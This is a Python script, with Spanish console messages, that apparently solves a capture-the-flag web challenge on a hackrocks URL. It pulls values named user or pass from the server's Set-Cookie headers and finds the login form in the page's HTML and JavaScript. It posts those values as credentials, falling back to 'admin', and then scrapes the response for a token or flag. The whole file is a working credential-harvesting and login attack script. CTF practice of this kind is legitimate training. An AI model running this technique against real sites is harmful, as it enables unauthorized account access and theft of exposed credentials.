import sys
import re
import requests
from urllib.parse import urljoin


def get_cookie_dict(cookie_header):
    fields = {}
    for pair in cookie_header.split(','):
        if '=' not in pair:
            continue
        k, _, v = pair.partition('=')
        fields[k.strip()] = v.strip()
    return fields


def find_form_action(html):
    m = re.search(r'<form[^>]+action=["\']([^"\']+)["\']', html, re.I)
    return m.group(1) if m else None


def find_inputs(html):
    return re.findall(r'<input[^>]+name=["\']([^"\']+)["\']', html, re.I)


def get_page_source(session, url):
    resp = session.get(url, timeout=15)
    print(f'[*] GET {url} -> {resp.status_code}')

    cookie_fields = {}
    for cookie_header in resp.raw.headers.getlist('Set-Cookie') or [resp.headers.get('Set-Cookie', '')]:
        cookie_fields.update(get_cookie_dict(cookie_header))

    source = resp.text
    js_matches = re.findall(r'<script[^>]+src=["\']([^"\']+\.js)["\']', resp.text, re.I)
    for js in js_matches:
        js_url = urljoin(url.rstrip('/') + '/', js)
        try:
            js_resp = session.get(js_url, timeout=15)
            if js_resp.ok:
                source += '\n' + js_resp.text
        except requests.RequestException:
            pass
    return cookie_fields, source


def solve(url):
    session = requests.Session()
    candidates = {}
    cookie_fields, source = get_page_source(session, url)
    print('[*] Cookies recibidas por el servidor:')
    for k, v in cookie_fields.items():
        print(f'    {k}={v}')
        lk = k.lower()
        if 'user' in lk or 'pass' in lk:
            candidates[k] = v

    if not candidates:
        print('[*] No se detectaron credenciales en las cookies.')
        return

    form_url = find_form_action(source)
    if not form_url:
        print('[*] No se detecto un formulario de login en HTML/JS.')
        return
    form_url = urljoin(url + '/', form_url)
    print(f'[*] Formulario de login detectado: {form_url}')

    creds = {}
    for k, v in candidates.items():
        lk = k.lower()
        if 'pass' in lk:
            creds['password'] = v
        elif 'user' in lk:
            creds['user'] = v
    if 'user' not in creds:
        creds['user'] = 'admin'
        print('[!] No se hallo cookie de usuario, probando con "admin"')
    print(f'[*] Probando credenciales -> user: {creds.get("user")} | password: {creds.get("password")}')

    login = session.post(form_url, data=creds, timeout=15)
    print(f'[*] POST {form_url} -> {login.status_code}')

    for pattern in [r'<[^>]*success-text[^>]*>\s*([^<]+)',
                    r'token[^<>]{0,5}[:]?\s*</[^>]+>\s*<[^>]+>\s*([^<]+)',
                    r'(?:token|flag)[^<>]*?>\s*([^<]{4,})']:
        m = re.search(pattern, login.text, re.I | re.S)
        if m:
            token = m.group(1).strip()
            print(f'\n[+] TOKEN / FLAG: {token}')
            print(f'[+] RESULTADO: {token}')
            return

    print('[+] Respuesta de la pagina (busca el token manualmente si no aparece):')
    print(login.text[:2000])


if __name__ == '__main__':
    target = sys.argv[1] if len(sys.argv) > 1 else 'https://challenges.hackrocks.com/wanna-some-cookies'
    solve(target)